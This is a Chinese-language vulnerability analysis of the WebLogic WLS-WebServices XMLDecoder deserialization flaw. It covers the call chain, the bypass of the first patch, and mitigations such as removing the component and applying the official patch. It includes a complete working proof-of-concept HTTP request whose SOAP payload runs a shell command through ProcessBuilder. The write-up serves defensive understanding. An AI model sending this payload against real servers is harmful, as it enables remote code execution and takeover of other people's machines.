# WebLogic WLS-WebServices组件反序列化漏洞分析
最近由于数字货币的疯涨，大量机器被入侵后用来挖矿，其中存在不少部署了Weblogic服务的机器，因为Weblogic最近所爆出安全漏洞的exploit在地下广泛流传。回到这个漏洞本身，其原因在于WLS-WebServices这个组件中，因为它使用了XMLDecoder来解析XML数据。有安全研究人员在去年八月份就向官方报告了此漏洞，Oralce官方在今年四月份提供了补丁程序。但是，四月份提供的补丁感觉是在敷衍了事，因此很快就被绕过了。为此官方又只能新发补丁，不过十月份所提供的补丁，检查还是比较严格。下面具体来看看此次反序列漏洞
## 0x01漏洞复现
测试环境 Weblogic 10.3.6.0/jdk1.6.0_45/Linux
漏洞POC

```
POST /wls-wsat/CoordinatorPortType11 HTTP/1.1
Host: 127.0.0.1:7001
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Connection: close
Content-Type: text/xml
Content-Length: 777

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  
  <soapenv:Header> 
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  
      <java> 
        <void class="java.lang.ProcessBuilder"> 
          <array class="java.lang.String" length="3"> 
            <void index="0"> 
              <string>/bin/sh</string> 
            </void>  
            <void index="1"> 
              <string>-c</string> 
            </void>  
            <void index="2"> 
              <string>id > /tmp/chaitin</string>
            </void> 
          </array>  
          <void method="start"/> 
        </void> 
      </java> 
    </work:WorkContext> 
  </soapenv:Header>  
  <soapenv:Body/> 
</soapenv:Envelope>
```
![](http://ogmho3r7t.bkt.clouddn.com/2017-12-23-15139326533815.jpg)
![](http://ogmho3r7t.bkt.clouddn.com/2017-12-23-15139326768139.jpg)
## 0x02漏洞分析
此次漏洞出现在wls-wsat.war中，此组件使用了weblogic自带的webservices处理程序来处理SOAP请求。然后在

```
weblogic.wsee.jaxws.workcontext.WorkContextServerTube
```
类中获取XML数据传递给XMLDecoder来解析。

解析XML的调用链为

```
weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest

weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld

weblogic.wsee.workarea.WorkContextXmlInputAdapter

```
首先看到weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest方法
![](http://ogmho3r7t.bkt.clouddn.com/2017-12-23-15139338809033.jpg)
获取到localHeader1后传递给readHeaderOld方法，其内容为```<work:WorkContext>```所包裹的数据，然后继续跟进weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld方法
![](http://ogmho3r7t.bkt.clouddn.com/2017-12-23-15139340157538.jpg)
在此方法中实例化了WorkContextXmlInputAdapter类，并且将获取到的XML格式的序列化数据传递到此类的构造方法中，最后通过XMLDecoder来进行反序列化操作。
![](http://ogmho3r7t.bkt.clouddn.com/2017-12-23-15139341082935.jpg)
关于XMLDecoder的反序化问题13年就已经被人发现，近期再次被利用到Weblogic中由此可见JAVA生态圈中的安全问题是多么糟糕。值得一提的是此次漏洞出现了两处CVE编号，因为在Oracle官方在修复CVE-2017-3506所提供的patch只是简单的检查了XML中是否包含了<object>节点，然后将<object>换为<void>即可绕过此补丁。因此在修复过程中用户一定要使用Oracle官方十月份所提供的patch。

##0x03漏洞防御
1. 临时解决方案
根据业务所有需求，考虑是否删除WLS-WebServices组件。包含此组件路径为：

```
Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat

Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war

Middleware/wlserver_10.3/server/lib/wls-wsat.war
```
以上路径都在WebLogic安装处。删除以上文件之后，需重启WebLogic。确认http://weblogic_ip/wls-wsat/ 是否为404页面。

2. 官方补丁修复
前往oralce官网下载10月份所提供的安全补丁。

## 0x04 参考资料
http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html
https://github.com/pwntester/XMLDecoder

